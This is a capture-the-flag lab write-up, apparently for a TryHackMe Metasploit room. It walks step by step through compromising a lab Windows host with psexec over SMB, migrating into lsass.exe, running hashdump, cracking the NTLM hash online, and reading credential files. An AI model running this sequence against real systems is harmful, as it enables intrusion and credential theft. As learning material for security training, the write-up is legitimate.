*** Post-Exploitation Challenge ***

> After launching the THM AttackBox, i then went ahead and launch Metasploit by inputting the commnad "msfconsole," then "enter."

> I then had to use the credentials, username: "ballen," and password: "Password1" to simulate an initial compromise over SMB using exploit module "exploit/windows/smb/psexec." To do this i first inputted the
command "search exploit/windows/smb/psexec," then "enter," then "use 0," then "enter" again.

> I then inputted the command "show options" to check to see if RHOSTS was set and it wasnt so i inputted the command "set RHOSTS 10.201.121.54," then "enter," then "show options" to confirm that it was set.

> I then had to set the SMBUser & SMBPass to carry out the compromise. To do this i inputted the command "set smbpass Password1," then "enter," then set smbuser "ballen," then "enter," then "show options" to
confirm that everything was set correctly.

> I then inputted the command "run" to carry out the exploit and start the Meterpreter session.

> Moving on to the practical questions, my first exercise was to figure out the "computer name." To do this i inputted the command "sysinfo," then "enter." This displayed the "computer name" as "ACME-TEST."

> <img width="543" height="179" alt="meta46" src="https://github.com/user-attachments/assets/447a4a88-1fac-4a67-9772-a713413ed79a" />

> I then had to figure out the "target domain" which was also within the sysinfo. The "target domain" was "FLASH."

> <img width="527" height="169" alt="meta47" src="https://github.com/user-attachments/assets/04dd8cf6-2a22-438a-9768-ad62b5959546" />

> I then had to figure out the name of the share created by the user. To do this first had to background the Meterpreter session by using the command "background," then "enter"

> <img width="351" height="37" alt="meta48" src="https://github.com/user-attachments/assets/7aea5d98-b6be-4056-ad19-68711237aa1f" />

> Then i search for the "enum shares" module by inputting the command "search enum_shares," then "enter," then "use 0," then "enter," then "show options" to check if everything was fill in and saw that the
"SESSION" option was blank so i inputted the command "set SESSION 1," then "enter" because that was the Meterpreter session we were running on. After setting the SESSION option i inputted "run," then "enter,"
and got the enum_share of "speedster."

> For the next question i had to figure out the NTLM hash of the jchambers user. To do this i had to first get out of the msfconsole exploit module and take the Meterpreter session out of the background by
foregrounding it. I inputted the command "session -i 1," then "enter," then "ps" to list all of the running processes on my Meterpreter's session. i then had to look for a specific process to migrate to in order
to get the NTLM hash of the jchambers user which was the "lsass.exe" process.

> After using the command "migrate 764," then "enter" to get to the "lsass.exe" process. I inputted "hashdump," then "enter" to get jchambers user's NTLM hash. Which was "69596c7aa1e8daee17f8e78870e25a5c"

> I then had to figure out the cleartext password of the jchambers user. To do this i just used a a free online hash cracker "crackstation.net" and got the password of "Trustno1"

> For the next question i had to find out the full path of the "secrets.txt" file. To do this all i did was inputted the command "search -f secrets.txt," then "enter" which gave me the full path of
"c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt."

> <img width="983" height="179" alt="meta55" src="https://github.com/user-attachments/assets/158d8a21-e0c0-4578-a6cc-68993441d8a6" />

> Then i had to get the Twitter password of the same "secrets.txt" file. To do this i inputted the command "cat 'c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt'." Then "enter" which gave me the
password "KDSvbsw3849!."

> <img width="749" height="65" alt="meta56" src="https://github.com/user-attachments/assets/07672c26-61bd-41b0-9ae9-57ea0a6230f5" />

> Next question i was given something similar to the last question, i had to find out the fullm path of the "realsecret.txt" file. To do this all i did was inputted the "search -f realsecret.txt," then "enter"
which gave me the full path of "c:\inetpub\wwwroot\realsecret.txt."

> <img width="755" height="140" alt="meta57" src="https://github.com/user-attachments/assets/c04ebb01-04dd-42d6-b10e-c50bfd3cbf82" />

> I then had to uncover the "realsecret.txt" file. To do this i inputted the command "cat 'c:\inetpub\wwwroot\realsecret.txt'." Then "enter" which gave me the secret: "The Flash is the fastest man alive."
